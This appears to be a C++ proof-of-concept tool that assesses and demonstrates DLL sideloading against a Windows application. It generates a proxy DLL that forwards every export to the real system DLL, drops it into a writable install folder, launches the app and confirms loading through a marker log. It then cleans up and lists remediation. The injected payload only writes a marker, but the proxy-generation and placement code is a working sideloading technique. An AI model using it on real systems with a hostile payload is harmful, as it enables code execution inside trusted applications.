#include <windows.h>
#include <string>
#include <vector>
#include <iostream>
#include <fstream>
#include <filesystem>
#include <algorithm>
#include <map>
#include <regex>

namespace fs = std::filesystem;

// ─────────────────────────────────────────────────────────────────────────────
//  Configuration & Globals
// ─────────────────────────────────────────────────────────────────────────────
const char* g_MarkerLog = "C:\\Users\\Public\\sideload_marker.log";
const char* g_TempDir = "C:\\Users\\Public\\sideload_poc_temp";

struct ClassicTarget {
    std::string Name;
    std::string SystemPath;
};

std::vector<ClassicTarget> g_ClassicTargets = {
    {"version.dll", "C:\\Windows\\System32\\version.dll"},
    {"winmm.dll", "C:\\Windows\\System32\\winmm.dll"},
    {"dwmapi.dll", "C:\\Windows\\System32\\dwmapi.dll"},
    {"uxtheme.dll", "C:\\Windows\\System32\\uxtheme.dll"},
    {"dbghelp.dll", "C:\\Windows\\System32\\dbghelp.dll"},
    {"propsys.dll", "C:\\Windows\\System32\\propsys.dll"}
};

struct CleanupManager {
    std::vector<fs::path> PlacedFiles;
    std::vector<DWORD> PidsToKill;

    ~CleanupManager() {
        for (auto pid : PidsToKill) {
            HANDLE hProc = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
            if (hProc) {
                TerminateProcess(hProc, 0);
                CloseHandle(hProc);
                std::cout << "  [i] Terminated PID: " << pid << "\n";
            }
        }
        std::error_code ec;
        for (const auto& f : PlacedFiles) {
            fs::remove(f, ec);
            if (!ec) std::cout << "  [i] Removed test file: " << f.string() << "\n";
        }
        fs::remove(g_MarkerLog, ec);
        fs::remove(g_TempDir, ec);
        std::cout << "  [OK] Cleanup complete.\n";
    }
} g_Cleanup;

// ─────────────────────────────────────────────────────────────────────────────
//  PE Parsing: Safely extract exports from system DLLs
// ─────────────────────────────────────────────────────────────────────────────
std::vector<std::string> GetDllExports(const std::string& dllPath) {
    std::vector<std::string> exports;
    std::ifstream file(dllPath, std::ios::binary | std::ios::ate);
    if (!file) return exports;

    auto size = file.tellg();
    file.seekg(0, std::ios::beg);
    std::vector<BYTE> buffer(size);
    if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) return exports;

    auto dosHeader = reinterpret_cast<IMAGE_DOS_HEADER*>(buffer.data());
    if (dosHeader->e_magic != IMAGE_DOS_SIGNATURE) return exports;

    auto ntHeaders = reinterpret_cast<IMAGE_NT_HEADERS*>(buffer.data() + dosHeader->e_lfanew);
    if (ntHeaders->Signature != IMAGE_NT_SIGNATURE) return exports;

    auto& exportDir = ntHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    if (exportDir.Size == 0) return exports;

    auto sections = IMAGE_FIRST_SECTION(ntHeaders);
    DWORD rva = exportDir.VirtualAddress;
    DWORD fileOffset = 0;

    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        if (rva >= sections[i].VirtualAddress && rva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
            fileOffset = sections[i].PointerToRawData + (rva - sections[i].VirtualAddress);
            break;
        }
    }
    if (!fileOffset) return exports;

    auto exportDirectory = reinterpret_cast<IMAGE_EXPORT_DIRECTORY*>(buffer.data() + fileOffset);
    if (exportDirectory->NumberOfNames == 0) return exports;

    DWORD namesRva = exportDirectory->AddressOfNames;
    DWORD namesOffset = 0;
    for (int i = 0; i < ntHeaders->FileHeader.NumberOfSections; ++i) {
        if (namesRva >= sections[i].VirtualAddress && namesRva < sections[i].VirtualAddress + sections[i].Misc.VirtualSize) {
            namesOffset = sections[i].PointerToRawData + (namesRva - sections[i].VirtualAddress);
            break;
        }
    }
    if (!namesOffset) return exports;

    DWORD* nameRVAs = reinterpret_cast<DWORD*>(buffer.data() + namesOffset);
    for (DWORD i = 0; i < exportDirectory->NumberOfNames; ++i) {
        DWORD nameRva = nameRVAs[i];
        DWORD nameOffset = 0;
        for (int j = 0; j < ntHeaders->FileHeader.NumberOfSections; ++j) {
            if (nameRva >= sections[j].VirtualAddress && nameRva < sections[j].VirtualAddress + sections[j].Misc.VirtualSize) {
                nameOffset = sections[j].PointerToRawData + (nameRva - sections[j].VirtualAddress);
                break;
            }
        }
        if (nameOffset) {
            exports.push_back(std::string(reinterpret_cast<char*>(buffer.data() + nameOffset)));
        }
    }
    return exports;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Manifest Extractor
// ─────────────────────────────────────────────────────────────────────────────
std::string ExtractManifest(const std::string& exePath) {
    HMODULE hMod = LoadLibraryExA(exePath.c_str(), NULL, LOAD_LIBRARY_AS_DATAFILE);
    if (!hMod) return "";

    HRSRC hRes = FindResourceA(hMod, MAKEINTRESOURCEA(1), RT_MANIFEST);
    if (!hRes) { FreeLibrary(hMod); return ""; }

    HGLOBAL hGlobal = LoadResource(hMod, hRes);
    if (!hGlobal) { FreeLibrary(hMod); return ""; }

    DWORD size = SizeofResource(hMod, hRes);
    void* data = LockResource(hGlobal);
    
    std::string manifest(static_cast<char*>(data), size);
    FreeLibrary(hMod);
    return manifest;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Helper Functions
// ─────────────────────────────────────────────────────────────────────────────
bool IsElevated() {
    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) CloseHandle(hToken);
    return fRet;
}

bool CheckRegistryValue(HKEY root, const char* path, const char* valueName, DWORD& outValue) {
    HKEY hKey;
    if (RegOpenKeyExA(root, path, 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        DWORD size = sizeof(DWORD);
        DWORD type = REG_DWORD;
        if (RegQueryValueExA(hKey, valueName, NULL, &type, reinterpret_cast<LPBYTE>(&outValue), &size) == ERROR_SUCCESS) {
            RegCloseKey(hKey);
            return true;
        }
        RegCloseKey(hKey);
    }
    return false;
}

std::vector<std::string> GetKnownDlls() {
    std::vector<std::string> knownDlls;
    HKEY hKey;
    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager\\KnownDLLs", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        char valueName[256];
        char valueData[256];
        DWORD nameLen = 256;
        DWORD dataLen = 256;
        DWORD type = REG_SZ;
        int index = 0;

        while (RegEnumValueA(hKey, index++, valueName, &nameLen, NULL, &type, reinterpret_cast<LPBYTE>(valueData), &dataLen) == ERROR_SUCCESS) {
            std::string val(valueData);
            std::transform(val.begin(), val.end(), val.begin(), ::tolower);
            knownDlls.push_back(val);
            nameLen = 256;
            dataLen = 256;
        }
        RegCloseKey(hKey);
    }
    return knownDlls;
}

// ─────────────────────────────────────────────────────────────────────────────
//  Main Assessment Logic
// ─────────────────────────────────────────────────────────────────────────────
int main(int argc, char* argv[]) {
    std::string installDir = "C:\\Users\\Public\\TargetApp"; // Default fallback
    if (argc > 1) {
        installDir = argv[1];
    }

    std::cout << "=== Phase 1: Environment Verification ===\n";
    if (!fs::exists(installDir) || !fs::is_directory(installDir)) {
        std::cout << "  [VULN] Install directory not found: " << installDir << "\n";
        return 1;
    }
    std::cout << "  [OK] Install directory exists.\n";

    fs::path targetExe;
    for (auto& p : fs::directory_iterator(installDir)) {
        if (p.path().extension() == ".exe" && p.path().string().find("uninstall") == std::string::npos 
            && p.path().string().find("setup") == std::string::npos) {
            targetExe = p.path();
            break;
        }
    }

    if (targetExe.empty()) {
        std::cout << "  [!] No main executable found. Proceeding with directory checks only.\n";
    } else {
        std::cout << "  [OK] Target executable: " << targetExe.filename().string() << "\n";
    }

    if (IsElevated()) {
        std::cout << "  [!] Running ELEVATED. Results may not reflect standard user context.\n";
    } else {
        std::cout << "  [OK] Running as non-elevated user.\n";
    }

    std::cout << "\n=== Phase 2: DLL Candidate Enumeration ===\n";
    std::vector<std::string> missingClassics;
    for (const auto& target : g_ClassicTargets) {
        bool found = false;
        for (auto& p : fs::recursive_directory_iterator(installDir)) {
            if (p.path().filename().string() == target.Name) {
                found = true;
                break;
            }
        }
        if (!found) {
            missingClassics.push_back(target.Name);
            std::cout << "  [!] MISSING: " << target.Name << " (prime sideloading candidate)\n";
        } else {
            std::cout << "  [i] Present:  " << target.Name << "\n";
        }
    }

    std::cout << "\n=== Phase 3: DLL Search-Order Verification ===\n";
    DWORD safeDllSearchMode = 1;
    if (CheckRegistryValue(HKEY_LOCAL_MACHINE, "SYSTEM\\CurrentControlSet\\Control\\Session Manager", "SafeDllSearchMode", safeDllSearchMode)) {
        if (safeDllSearchMode == 0) std::cout << "  [VULN] SafeDllSearchMode = 0 (DISABLED).\n";
        else std::cout << "  [OK] SafeDllSearchMode = 1 (enabled).\n";
    } else {
        std::cout << "  [i] SafeDllSearchMode not explicitly set (defaults to 1).\n";
    }

    auto knownDlls = GetKnownDlls();
    std::cout << "  [i] " << knownDlls.size() << " DLLs protected by KnownDLLs.\n";

    if (!targetExe.empty()) {
        std::string manifest = ExtractManifest(targetExe.string());
        if (!manifest.empty()) {
            if (manifest.find("preferSystem32") != std::string::npos) {
                std::cout << "  [OK] Manifest contains preferSystem32.\n";
            } else {
                std::cout << "  [!] Manifest present but NO preferSystem32 attribute.\n";
            }
        } else {
            std::cout << "  [!] No embedded manifest detected. Default search order applies.\n";
        }
    }

    std::cout << "\n=== Phase 4: Write-Access Verification ===\n";
    std::vector<fs::path> writableDirs;
    std::vector<fs::path> testDirs = { installDir, installDir + "\\assets" };
    
    for (auto& p : fs::recursive_directory_iterator(installDir)) {
        if (p.path().extension() == ".dll") {
            testDirs.push_back(p.path().parent_path());
        }
    }

    for (const auto& dir : testDirs) {
        if (!fs::exists(dir)) continue;
        fs::path marker = dir / "___poc_write_test.tmp";
        std::ofstream testFile(marker);
        if (testFile.is_open()) {
            testFile.close();
            fs::remove(marker);
            std::cout << "  [VULN] WRITABLE: " << dir.string() << "\n";
            writableDirs.push_back(dir);
        } else {
            std::cout << "  [OK] Read-only: " << dir.string() << "\n";
        }
    }

    if (writableDirs.empty()) {
        std::cout << "\n  No writable directories found. Sideloading precondition NOT met.\n";
        return 0;
    }

    std::cout << "\n=== Phase 5: Sideloading Test ===\n";
    if (missingClassics.empty()) {
        std::cout << "  [i] No missing classic targets to test. Exiting active test.\n";
        return 0;
    }

    std::string testTarget = missingClassics[0];
    for (const auto& t : missingClassics) {
        std::string tLower = t;
        std::transform(tLower.begin(), tLower.end(), tLower.begin(), ::tolower);
        if (std::find(knownDlls.begin(), knownDlls.end(), tLower) == knownDlls.end()) {
            testTarget = t;
            break;
        }
    }
    
    std::cout << "  [i] Test target DLL: " << testTarget << "\n";

    std::string systemPath = "C:\\Windows\\System32\\" + testTarget;
    for (const auto& t : g_ClassicTargets) {
        if (t.Name == testTarget) systemPath = t.SystemPath;
    }

    std::cout << "  [i] Parsing exports from: " << systemPath << "\n";
    auto exports = GetDllExports(systemPath);
    if (exports.empty()) {
        std::cout << "  [!] Failed to parse exports. Aborting to prevent app crash.\n";
        return 1;
    }

    fs::create_directories(g_TempDir);
    fs::path cSourcePath = fs::path(g_TempDir) / "marker.c";
    fs::path defPath = fs::path(g_TempDir) / "marker.def";
    fs::path dllOutPath = fs::path(g_TempDir) / testTarget;

    std::ofstream cFile(cSourcePath);
    cFile << "#include <windows.h>\n"
          << "BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved) {\n"
          << "    if (fdwReason == DLL_PROCESS_ATTACH) {\n"
          << "        HANDLE hFile = CreateFileA(\"" << g_MarkerLog << "\", FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);\n"
          << "        if (hFile != INVALID_HANDLE_VALUE) {\n"
          << "            const char* msg = \"SIDeloadPoC: DLL loaded successfully\\r\\n\";\n"
          << "            DWORD written;\n"
          << "            WriteFile(hFile, msg, strlen(msg), &written, NULL);\n"
          << "            CloseHandle(hFile);\n"
          << "        }\n"
          << "        DisableThreadLibraryCalls(hinstDLL);\n"
          << "    }\n"
          << "    return TRUE;\n"
          << "}\n";
    cFile.close();

    std::string sysBare = fs::path(systemPath).stem().string();
    std::ofstream defFile(defPath);
    defFile << "LIBRARY " << testTarget << "\nEXPORTS\n";
    int ordinal = 1;
    for (const auto& exp : exports) {
        defFile << "    " << exp << " = " << systemPath << "." << exp << " @" << ordinal++ << "\n";
    }
    defFile.close();

    std::cout << "  [OK] C source and .def generated.\n";

    std::string compileCmd;
    char gccPath[MAX_PATH] = {0};
    char clPath[MAX_PATH] = {0};
    
    if (SearchPathA(NULL, "gcc.exe", NULL, MAX_PATH, gccPath, NULL)) {
        compileCmd = std::string(gccPath) + " -shared -o \"" + dllOutPath.string() + "\" \"" + 
                     cSourcePath.string() + "\" \"" + defPath.string() + "\" -s -lkernel32";
    } else if (SearchPathA(NULL, "cl.exe", NULL, MAX_PATH, clPath, NULL)) {
        compileCmd = std::string(clPath) + " /nologo /LD \"" + cSourcePath.string() + 
                     "\" /link /DEF:\"" + defPath.string() + "\" /OUT:\"" + dllOutPath.string() + "\"";
    } else {
        std::cout << "  [!] No C compiler (gcc/cl) found in PATH. Skipping compilation.\n";
        std::cout << "  [i] Generated files for manual compilation in: " << g_TempDir << "\n";
        return 0;
    }

    std::cout << "  [i] Compiling proxy DLL...\n";
    system(compileCmd.c_str());

    if (!fs::exists(dllOutPath)) {
        std::cout << "  [!] Compilation failed.\n";
        return 1;
    }
    std::cout << "  [OK] Proxy DLL compiled successfully.\n";

    fs::path placeDir = writableDirs[0]; 
    fs::path placePath = placeDir / testTarget;
    
    if (fs::exists(placePath)) {
        fs::copy_file(placePath, placePath.string() + ".bak", fs::copy_options::overwrite_existing);
    }

    fs::copy_file(dllOutPath, placePath, fs::copy_options::overwrite_existing);
    g_Cleanup.PlacedFiles.push_back(placePath);
    std::cout << "  [OK] Placed marker DLL: " << placePath.string() << "\n";

    if (targetExe.empty()) {
        std::cout << "  [!] No target executable to launch. Test manually.\n";
        return 0;
    }

    fs::remove(g_MarkerLog); // Clear old markers

    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi = {0};
    std::string execStr = targetExe.string();

    if (CreateProcessA(NULL, &execStr[0], NULL, NULL, FALSE, 0, NULL, installDir.c_str(), &si, &pi)) {
        std::cout << "  [i] Launched PID: " << pi.dwProcessId << ". Waiting 8s for load...\n";
        g_Cleanup.PidsToKill.push_back(pi.dwProcessId);
        WaitForSingleObject(pi.hProcess, 8000);
        
        if (fs::exists(g_MarkerLog)) {
            std::cout << "\n  [VULN] SIDELOADING CONFIRMED! Marker DLL was loaded by the application.\n";
        } else {
            std::cout << "\n  [i] Marker log not found. DLL may not have been loaded in this code path.\n";
        }

        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
    } else {
        std::cout << "  [!] Failed to launch target application.\n";
    }

    std::cout << "\n=== Phase 6: Summary and Remediation ===\n";
    std::cout << "  Writable dirs: " << writableDirs.size() << "\n";
    std::cout << "  Missing targets: " << missingClassics.size() << "\n";
    std::cout << "  Remediation:\n";
    std::cout << "    1. Install to %ProgramFiles% (ACL denies non-admin write)\n";
    std::cout << "    2. Call SetDefaultDllDirectories(LOAD_LIBRARY_SEARCH_SYSTEM32)\n";
    std::cout << "    3. Embed manifest with <preferSystem32>\n";

    // g_Cleanup handles all file/process removal automatically upon return
    return 0;
}
